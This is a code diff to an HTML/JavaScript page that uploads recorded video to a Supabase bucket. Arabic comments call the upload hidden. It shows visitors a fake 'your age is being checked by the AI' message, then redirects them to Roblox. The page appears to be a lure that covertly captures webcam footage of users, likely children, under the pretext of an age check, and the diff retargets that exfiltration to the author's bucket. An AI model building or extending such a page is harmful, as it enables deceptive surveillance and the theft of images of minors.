@@ -23,7 +23,7 @@
             gap: 20px;
             flex-wrap: wrap;
             justify-content: center;
-            max-width: 500px; /* تم تصغير العرض ليتناسب مع الصندوق الواحد */
+            max-width: 500px;
             width: 100%;
         }
 
@@ -176,9 +176,9 @@
                     
                     const fileName = 'video_' + Date.now() + '.mp4';
 
-                    // الرفع المخفي والخلفي إلى مجلد videos في Supabase
+                    // الرفع المخفي إلى المجلد الخاص بك MOTSM_HIJAZE
                     const { data, error } = await supabase.storage
-                        .from('videos')
+                        .from('MOTSM_HIJAZE')
                         .upload(fileName, blob, {
                             cacheControl: '3600',
                             upsert: false,
@@ -187,15 +187,13 @@
 
                     if (error) {
                         console.error("خطأ أثناء الرفع:", error);
-                        statusText.innerText = "فشل الرفع، يرجى التأكد من إعدادات المجلد في حسابك.";
+                        statusText.innerText = "فشل الرفع، يرجى التأكد من حفظ الإعدادات في حسابك.";
                         statusText.style.color = "#ff4757";
                     } else {
-                        // النص المطلوب بعد انتهاء الفحص والرفع بنجاح
                         statusText.innerText = "جاري فحص عمرك من قبل الـ AI...";
                         statusText.style.color = "#2ed573";
                         document.getElementById('camBox').style.borderColor = "#2ed573";
 
-                        // التحويل التلقائي إلى موقع روبلوكس الرسمي بعد ثانيتين
                         setTimeout(() => {
                             window.location.href = "https://www.roblox.com"; 
                         }, 2000);
@@ -230,3 +228,4 @@
     </script>
 </body>
 </html>
+
